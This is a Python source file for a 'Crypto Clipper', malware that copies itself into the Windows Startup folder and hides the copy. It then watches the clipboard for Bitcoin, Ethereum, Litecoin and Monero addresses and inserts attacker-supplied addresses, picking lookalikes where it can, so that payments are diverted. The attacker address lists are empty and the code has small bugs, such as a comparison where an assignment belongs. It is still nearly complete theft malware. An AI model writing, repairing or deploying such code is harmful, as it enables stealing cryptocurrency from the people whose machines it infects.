import re, os, time, shutil, random, difflib, subprocess
import tkinter as tk

# I know the prints are useless, they were for testing purposes and they don't annoy anyone.

# Clear
clear = lambda: os.system("cls" if os.name in ("nt", "dos") else "clear") # Don't touch this

# Patterns
patterns = [
    r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$', # Bitcoin
    r'^0x[a-zA-F0-9]{40}$', # Ethereum
    r'[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$', # Litecoin
    r'^4([0-9]|[A-B])(.){93}$' # Monero
]

# Start
clear()
os.system("title Crypto Clipper - Powered on!")
print("\x1b[38;5;147m[\x1b[0m+\x1b[38;5;147m]\x1b[0m Powered on!\x1b[38;5;147m\x1b[0m ")

# Bitcoin Addresses List
btc_address = [
    '',
]

# Ethereum Addresses List
eth_address = [
    '',
]

# Litecoin Addresses List
ltc_address = [
    '',
]

# Monero Addresses List
mon_address = [
    '',
]

# Add to startup and make it hidden
def start_up():
    user = os.getlogin()
    basename = os.path.basename(__file__)
    shutil.copy(basename, f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    subprocess.check_call(["attrib","+H", f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{basename}'])
    print("\x1b[38;5;147m[\x1b[0m+\x1b[38;5;147m]\x1b[0m Attached to startup.\x1b[38;5;147m\x1b[0m ")
    os.system("title Crypto Clipper - Attached to startup!")

# Clipper
def clipper():
    print("\x1b[38;5;147m[\x1b[0m+\x1b[38;5;147m]\x1b[0m Running!\x1b[38;5;147m\x1b[0m ")
    os.system("title Crypto Clipper - Running!")
    while True:
        time.sleep(1)

        root = tk.Tk()
        clipboard = root.clipboard_get()
        
        for pattern in patterns:
            if re.match(pattern, clipboard):
                index = patterns.index(pattern)

                if index == 0:
                    address_list = btc_address

                elif index == 1:
                    address_list = eth_address

                elif index == 2:
                    address_list == ltc_address

                elif index == 3:
                    address_list = mon_address

                match_address = difflib.get_close_matches(clipboard, address_list)
                if str(match_address) == '[]':
                    match_address = random.choice(address_list)

                root.clipboard_append(''.join(match_address))
            else:
                pass

# Main
if  __name__  == '__main__':
    start_up()
    clipper()